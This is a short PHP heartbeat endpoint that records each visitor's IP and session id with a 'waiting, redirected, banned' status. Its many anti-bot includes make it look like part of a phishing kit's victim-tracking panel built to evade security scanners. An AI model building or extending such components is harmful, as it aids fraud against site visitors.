<?php
session_start();
include 'src/antibots.php';
include 'antibots.php';
include 'anti/anti1.php';
include 'anti/anti2.php';
include 'anti/anti3.php';
include 'anti/anti4.php';
include 'anti/anti5.php';
include 'anti/anti6.php';
include 'anti/anti7.php';
include 'anti/anti8.php';


$ip = $_SERVER['REMOTE_ADDR'];
$vid = isset($_SESSION['vid']) ? $_SESSION['vid'] : 'anonymous';

$filepath = 'active_users.json';

// Charger les utilisateurs actifs
$users = file_exists($filepath) ? json_decode(file_get_contents($filepath), true) : [];

// Mettre à jour ou ajouter l’utilisateur
$users[$ip] = [
    'vid' => $vid,
    'last_seen' => time(),
    'status' => $users[$ip]['status'] ?? 'waiting' // waiting, redirected, banned...
];

// Enregistrer les données
file_put_contents($filepath, json_encode($users, JSON_PRETTY_PRINT));

echo json_encode(['status' => 'pong']);
?>
